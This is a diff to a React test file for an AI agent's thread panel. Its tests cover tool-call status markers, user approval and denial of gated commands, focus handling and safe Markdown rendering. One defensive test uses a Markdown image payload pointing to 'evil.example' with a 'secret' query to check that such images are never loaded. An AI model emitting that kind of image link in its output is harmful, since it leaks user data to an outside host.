@@ -1,10 +1,11 @@
 import { CallError, type Event } from "@kinby/contract"
 import { type Answers, stubCaller, stubSubscriber } from "@kinby/contract/testing"
-import { act, render, screen } from "@testing-library/react"
+import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react"
 import userEvent from "@testing-library/user-event"
 import { describe, expect, it } from "vitest"
 
 import { ThreadPanel } from "@/components/thread-panel"
+import { threadList } from "@/lib/thread-list"
 
 type Payload = Event["payload"]
 
@@ -19,7 +20,9 @@ function openThread(
     if (latest === undefined) throw new Error("The panel did not subscribe.")
     return latest
   }
-  return { client, subscription, unmount: rendered.unmount }
+  /** What the panel called besides the header listing the threads. */
+  const sent = () => client.calls.filter((call) => call.method !== "thread.list")
+  return { client, sent, subscription, unmount: rendered.unmount }
 }
 
 /** The thread's events, numbered from 1 in the order given. */
@@ -127,6 +130,7 @@ describe("a thread's panel", () => {
       ["turn-3", started("Deploy it")],
       ["turn-3", { type: "turn.interrupted" }],
       ["turn-4", started("Deploy it now")],
+      ["turn-4", call("c5", "read", { path: "deploy.log" })],
       ["turn-4", call("c4", "bash", { command: "make deploy" })],
       [
         "turn-4",
@@ -149,10 +153,11 @@ describe("a thread's panel", () => {
     for (const marker of [
       "read runtime.py · 38 ms",
       "write notes.md · denied by policy: read-only mode denies writes",
-      "edit runtime.py · approved by you",
+      "edit runtime.py · approved by you · running",
       "Done · 3 steps · 1,500 tokens",
       "Failed: The steps budget ran out. (BUDGET_EXCEEDED)",
       "Stopped",
+      "read deploy.log · running",
       "bash make deploy · waiting for you",
       "Working",
     ]) {
@@ -162,8 +167,84 @@ describe("a thread's panel", () => {
     expect(screen.getByText(/^Routine nightly-digest ·/)).toBeDefined()
   })
 
+  it("marks a failed turn's end as destructive, and a done turn's as not", async () => {
+    const events = thread(
+      ["turn-1", started("Fix the runtime")],
+      ["turn-1", { type: "turn.completed", input_tokens: 1_200, output_tokens: 300 }],
+      ["turn-2", started("Fix it again")],
+      [
+        "turn-2",
+        {
+          type: "turn.failed",
+          code: "BUDGET_EXCEEDED",
+          message: "The turn exceeded the steps budget of 1.",
+        },
+      ],
+    )
+    const { subscription } = openThread()
+
+    await act(async () => {
+      subscription().subscribed(events.length)
+      for (const event of events) subscription().deliver(event)
+    })
+
+    const variant = (text: string) =>
+      screen.getByText(text).closest("[data-slot=marker]")?.getAttribute("data-variant")
+    expect(variant("Failed: The turn exceeded the steps budget of 1. (BUDGET_EXCEEDED)")).toBe(
+      "destructive",
+    )
+    expect(variant("Done · 0 steps · 1,500 tokens")).toBe("default")
+  })
+
+  it("marks how long a call you approved took once it ran", async () => {
+    const events = thread(
+      ["turn-1", started("Deploy it")],
+      [
+        "turn-1",
+        { type: "tool.call", call_id: "c1", name: "bash", arguments: { command: "make deploy" } },
+      ],
+      [
+        "turn-1",
+        {
+          type: "tool.gated",
+          call_id: "c1",
+          name: "bash",
+          action: "allow",
+          decided_by: "user",
+          rule: "mode.ask.write",
+        },
+      ],
+      [
+        "turn-1",
+        {
+          type: "tool.result",
+          call_id: "c1",
+          name: "bash",
+          output: "",
+          error: false,
+          duration_ms: 12,
+        },
+      ],
+    )
+    const { subscription } = openThread()
+    await act(async () => {
+      subscription().subscribed(events.length)
+      for (const event of events) subscription().deliver(event)
+    })
+
+    expect(screen.getByText("bash make deploy · approved by you · 12 ms")).toBeDefined()
+  })
+
+  it("puts focus in the composer once the replay has loaded", async () => {
+    const { subscription } = openThread()
+
+    await act(async () => subscription().subscribed(0))
+
+    expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Message Ada" }))
+  })
+
   it("starts a turn with the message when Enter is pressed", async () => {
-    const { client, subscription } = openThread({
+    const { sent, subscription } = openThread({
       "thread.turn.start": () => ({ sequence: 1, thread_id: "t1", turn_id: "turn-1" }),
     })
     await act(async () => subscription().subscribed(0))
@@ -171,7 +252,7 @@ describe("a thread's panel", () => {
 
     await user.type(screen.getByRole("textbox", { name: "Message Ada" }), "Fix the runtime{Enter}")
 
-    expect(client.calls).toEqual([
+    expect(sent()).toEqual([
       { method: "thread.turn.start", params: { thread_id: "t1", message: "Fix the runtime" } },
     ])
     expect(screen.getByRole<HTMLTextAreaElement>("textbox", { name: "Message Ada" }).value).toBe("")
@@ -182,7 +263,7 @@ describe("a thread's panel", () => {
       ["turn-1", started("Deploy it")],
       ["turn-1", { type: "turn.interrupted" }],
     )
-    const { client, subscription } = openThread({
+    const { sent, subscription } = openThread({
       "thread.turn.interrupt": () => ({ sequence: 2, thread_id: "t1", turn_id: "turn-1" }),
     })
     await act(async () => {
@@ -193,7 +274,7 @@ describe("a thread's panel", () => {
 
     expect(screen.queryByRole("button", { name: "Send" })).toBeNull()
     await user.click(screen.getByRole("button", { name: "Stop" }))
-    expect(client.calls).toEqual([{ method: "thread.turn.interrupt", params: { thread_id: "t1" } }])
+    expect(sent()).toEqual([{ method: "thread.turn.interrupt", params: { thread_id: "t1" } }])
 
     await act(async () => subscription().deliver(events[1] as Event))
     expect(screen.queryByRole("button", { name: "Stop" })).toBeNull()
@@ -221,10 +302,11 @@ describe("a thread's panel", () => {
     const accepted = () => ({ sequence: 3, thread_id: "t1", turn_id: "turn-1" })
 
     /** Reopen the thread with its replay parked on approval a1. */
-    async function reopenParked() {
+    async function reopenParked(answers: Answers = {}) {
       const opened = openThread({
         "thread.approval.respond": accepted,
         "thread.turn.interrupt": accepted,
+        ...answers,
       })
       await act(async () => {
         opened.subscription().subscribed(parked.length)
@@ -232,6 +314,50 @@ describe("a thread's panel", () => {
       })
       return opened
     }
+
+    it("marks the answer pressed while it is out, and shows why once it fails", async () => {
+      let fail = (_error: CallError) => {}
+      const { subscription } = openThread(
+        {},
+        {
+          ...stubCaller({}),
+          ...stubSubscriber(),
+          call: () => new Promise<never>((_resolve, reject) => (fail = reject)),
+        },
+      )
+      await act(async () => {
+        subscription().subscribed(parked.length)
+        for (const event of parked) subscription().deliver(event)
+      })
+      const button = (name: string) =>
+        screen.getByRole<HTMLButtonElement>("button", { name: new RegExp(name) })
+
+      await userEvent.setup().click(button("Approve"))
+
+      expect(["Approve", "Deny", "Stop the turn"].map((name) => button(name).disabled)).toEqual([
+        true,
+        true,
+        true,
+      ])
+      expect(within(button("Approve")).getByRole("status")).toBeDefined()
+      expect(within(button("Deny")).queryByRole("status")).toBeNull()
+
+      await act(async () =>
+        fail(
+          new CallError({
+            code: "CONNECTION_LOST",
+            message: "The connection to the instance dropped.",
+            retryable: true,
+          }),
+        ),
+      )
+
+      expect(screen.getByRole("alert").textContent).toContain(
+        "The connection to the instance dropped.",
+      )
+      expect(within(button("Approve")).queryByRole("status")).toBeNull()
+      expect(button("Approve")).toHaveProperty("disabled", false)
+    })
 
     it("takes the composer's place with the tool, its main argument, the rule, and the arguments", async () => {
       await reopenParked()
@@ -243,12 +369,18 @@ describe("a thread's panel", () => {
       expect(approval.textContent).toContain('"command": "make deploy"')
     })
 
+    it("puts focus in the reason when the thread opens on it", async () => {
+      await reopenParked()
+
+      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Reason" }))
+    })
+
     it("approves it", async () => {
-      const { client } = await reopenParked()
+      const { sent } = await reopenParked()
 
       await userEvent.setup().click(screen.getByRole("button", { name: "Approve" }))
 
-      expect(client.calls).toEqual([
+      expect(sent()).toEqual([
         {
           method: "thread.approval.respond",
           params: { thread_id: "t1", approval_id: "a1", decision: "approve" },
@@ -257,13 +389,13 @@ describe("a thread's panel", () => {
     })
 
     it("denies it with the reason typed", async () => {
-      const { client } = await reopenParked()
+      const { sent } = await reopenParked()
       const user = userEvent.setup()
 
       await user.type(screen.getByRole("textbox", { name: "Reason" }), "  Use staging instead ")
       await user.click(screen.getByRole("button", { name: "Deny" }))
 
-      expect(client.calls).toEqual([
+      expect(sent()).toEqual([
         {
           method: "thread.approval.respond",
           params: {
@@ -276,12 +408,43 @@ describe("a thread's panel", () => {
       ])
     })
 
+    it("denies it with the reason typed when Enter is pressed, once", async () => {
+      const { sent } = await reopenParked()
+
+      await userEvent
+        .setup()
+        .type(screen.getByRole("textbox", { name: "Reason" }), "Use staging instead{Enter}{Enter}")
+
+      expect(sent()).toEqual([
+        {
+          method: "thread.approval.respond",
+          params: {
+            thread_id: "t1",
+            approval_id: "a1",
+            decision: "deny",
+            reason: "Use staging instead",
+          },
+        },
+      ])
+    })
+
+    it("does not deny while an input method is composing the reason", async () => {
+      const { sent } = await reopenParked()
+
+      fireEvent.keyDown(screen.getByRole("textbox", { name: "Reason" }), {
+        key: "Enter",
+        isComposing: true,
+      })
+
+      expect(sent()).toEqual([])
+    })
+
     it("denies it without a reason when none is typed", async () => {
-      const { client } = await reopenParked()
+      const { sent } = await reopenParked()
 
       await userEvent.setup().click(screen.getByRole("button", { name: "Deny" }))
 
-      expect(client.calls).toEqual([
+      expect(sent()).toEqual([
         {
           method: "thread.approval.respond",
           params: { thread_id: "t1", approval_id: "a1", decision: "deny" },
@@ -290,16 +453,36 @@ describe("a thread's panel", () => {
     })
 
     it("stops the turn instead", async () => {
-      const { client } = await reopenParked()
+      const { sent } = await reopenParked()
 
       await userEvent.setup().click(screen.getByRole("button", { name: "Stop the turn" }))
 
-      expect(client.calls).toEqual([
-        { method: "thread.turn.interrupt", params: { thread_id: "t1" } },
-      ])
+      expect(sent()).toEqual([{ method: "thread.turn.interrupt", params: { thread_id: "t1" } }])
     })
 
-    it("gives the composer back once the turn moves on", async () => {
+    it("marks the call as not run when the turn stops, live and on replay", async () => {
+      const { subscription, unmount } = await reopenParked()
+      const stopped: Event = {
+        sequence: 4,
+        thread_id: "t1",
+        turn_id: "turn-1",
+        timestamp: "2026-09-28T10:00:00Z",
+        payload: { type: "turn.interrupted" },
+      }
+
+      await act(async () => subscription().deliver(stopped))
+      expect(screen.getByText("bash make deploy · not run, turn stopped")).toBeDefined()
+
+      unmount()
+      const reopened = openThread()
+      await act(async () => {
+        reopened.subscription().subscribed(stopped.sequence)
+        for (const event of [...parked, stopped]) reopened.subscription().deliver(event)
+      })
+      expect(screen.getByText("bash make deploy · not run, turn stopped")).toBeDefined()
+    })
+
+    it("marks the call as not run when the turn fails", async () => {
       const { subscription } = await reopenParked()
 
       await act(async () =>
@@ -308,23 +491,154 @@ describe("a thread's panel", () => {
           thread_id: "t1",
           turn_id: "turn-1",
           timestamp: "2026-09-28T10:00:00Z",
-          payload: {
-            type: "tool.gated",
-            call_id: "c1",
-            name: "bash",
-            action: "deny",
-            decided_by: "user",
-            rule: "mode.ask.write",
-            reason: "Use staging instead",
-          },
+          payload: { type: "turn.failed", code: "INTERNAL", message: "The runner crashed." },
         }),
       )
+
+      expect(screen.getByText("bash make deploy · not run, turn failed")).toBeDefined()
+    })
+
+    /** The event that moves the turn on once the user denied a1 for `reason`. */
+    const denied = (reason: string): Event => ({
+      sequence: 4,
+      thread_id: "t1",
+      turn_id: "turn-1",
+      timestamp: "2026-09-28T10:00:00Z",
+      payload: {
+        type: "tool.gated",
+        call_id: "c1",
+        name: "bash",
+        action: "deny",
+        decided_by: "user",
+        rule: "mode.ask.write",
+        reason,
+      },
+    })
+
+    it("gives the composer back once the turn moves on", async () => {
+      const { subscription } = await reopenParked()
+
+      await act(async () => subscription().deliver(denied("Use staging instead")))
 
       expect(screen.queryByRole("region", { name: "Approve bash make deploy?" })).toBeNull()
       expect(screen.getByRole("textbox", { name: "Message Ada" })).toBeDefined()
       expect(
         screen.getByText("bash make deploy · denied by you: Use staging instead"),
       ).toBeDefined()
+    })
+
+    it("returns focus to the composer once the answered approval clears", async () => {
+      const { subscription } = await reopenParked()
+
+      await userEvent.setup().click(screen.getByRole("button", { name: "Deny" }))
+      await act(async () => subscription().deliver(denied("")))
+
+      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Message Ada" }))
+    })
+
+    it("leaves focus in the title being renamed when the approval clears", async () => {
+      const { client, subscription } = await reopenParked({
+        "thread.list": () => ({
+          threads: [
+            {
+              id: "t1",
+              title: "Deploy notes",
+              created_at: "2026-09-28T10:00:00Z",
+              last_activity_at: "2026-09-28T10:00:00Z",
+              status: "awaiting_approval",
+              mode: "ask",
+              mode_pinned: false,
+            },
+          ],
+          ceiling: "full-access",
+        }),
+      })
+      await act(() => threadList(client).list())
+      const user = userEvent.setup()
+
+      await user.click(screen.getByRole("button", { name: "Deploy notes" }))
+      await user.type(screen.getByRole("textbox", { name: "Thread title" }), " for staging")
+      await act(async () => subscription().deliver(denied("")))
+
+      expect(document.activeElement).toBe(screen.getByRole("textbox", { name: "Thread title" }))
+    })
+  })
+
+  describe("a reply", () => {
+    /** Open a thread whose one turn asked `request` and was answered with `reply`. */
+    async function replied(request: string, reply: string) {
+      const events = thread(
+        ["turn-1", started(request)],
+        ["turn-1", { type: "message.delta", text: reply }],
+      )
+      const { subscription } = openThread()
+      await act(async () => {
+        subscription().subscribed(events.length)
+        for (const event of events) subscription().deliver(event)
+      })
+      return screen.getByText("Ada").parentElement as HTMLElement
+    }
+
+    it("renders its Markdown", async () => {
+      const reply = await replied("Explain it", "The **runtime** reads `config.toml` first.")
+
+      expect(reply.querySelector("strong")?.textContent).toBe("runtime")
+      expect(reply.querySelector("code")?.textContent).toBe("config.toml")
+      expect(reply.textContent).not.toContain("**")
+      expect(reply.textContent).not.toContain("`")
+    })
+
+    it("renders a reply cut off mid-emphasis without the open marker", async () => {
+      const reply = await replied("Explain it", "The **runtime reads")
+
+      expect(reply.querySelector("strong")?.textContent).toBe("runtime reads")
+      expect(reply.textContent).not.toContain("**")
+    })
+
+    it("renders a reply cut off inside a code fence without the fence", async () => {
+      const reply = await replied("Show it", "Run this:\n\n```sh\nmake deploy")
+
+      expect(reply.querySelector("pre")?.textContent).toContain("make deploy")
+      expect(reply.textContent).not.toContain("```")
+    })
+
+    it("highlights the syntax of a fenced code block", async () => {
+      const reply = await replied("Show it", "```python\nimport os\n```")
+
+      await waitFor(() => {
+        const keyword = [...reply.querySelectorAll("pre span")].find(
+          (token) => token.textContent === "import",
+        )
+        expect(keyword?.getAttribute("style")).toContain("--sdm-c")
+      })
+    })
+
+    it("leaves the request as typed", async () => {
+      await replied("Deploy **now**, not `later`", "Deploying.")
+
+      expect(screen.getByText("Deploy **now**, not `later`")).toBeDefined()
+    })
+
+    it("shows raw HTML as text", async () => {
+      const reply = await replied("Explain it", "Use <b>bold</b> sparingly.")
+
+      expect(reply.querySelector("b")).toBeNull()
+      expect(reply.textContent).toContain("Use <b>bold</b> sparingly.")
+    })
+
+    it("loads no image it links to", async () => {
+      const reply = await replied("Explain it", "Done. ![pixel](https://evil.example/?q=secret)")
+
+      expect(reply.querySelector("img")).toBeNull()
+      expect(reply.textContent).toContain("Done.")
+    })
+
+    it("opens its links in a new tab", async () => {
+      await replied("Where is it?", "See [the docs](https://kinby.dev/docs).")
+
+      const link = screen.getByRole("link", { name: "the docs" })
+      expect(link.getAttribute("href")).toBe("https://kinby.dev/docs")
+      expect(link.getAttribute("target")).toBe("_blank")
     })
   })
 
